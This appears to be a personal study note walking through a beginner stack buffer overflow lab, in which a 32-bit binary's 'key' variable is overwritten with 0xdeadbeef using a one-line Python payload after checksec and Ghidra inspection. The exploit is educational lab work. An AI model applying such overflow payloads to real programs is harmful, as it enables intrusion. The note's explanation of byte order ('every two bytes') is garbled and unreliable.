[[Binary Exploitation/01-02 Overwriting variables on stack/02/Source Code|Source Code]]

### Basic File checks

1. File -> `./overwrite: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=094cbdd4694e5f4aeb958401302aadc77be2c5f0, for GNU/Linux 3.2.0, not stripped` 
2. checksec ->

```c
[*] '/root/binary_exploitation/02/overwrite'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

### Run the file

```c
./overwrite
```

Result:

```c
yes? sadadfsdgsdfg
12345678
...
```

### Look at the code using ghidra


Now what we want is to go past the buffer and change the value of the variable key which is right after the buffer

From ghidra we can tell the offset is 32 since the buffer is 32 now let's do it manually

### manual exploitation

now from ghidra we know the value it is checking the key to be is `0xdeadbeef` so we can use python 2 to give it that value

```python
print 32 * 'A' + '\xef\xbe\xad\xde'
```

Now if we print it it will be unprintable characters so we send the file to a payload file

We also it every two bytes in reverse order because that's how lsb works and this file is a lsb file

Automated: 
[[Binary Exploitation/01-02 Overwriting variables on stack/02/Python Script|Python Script]]

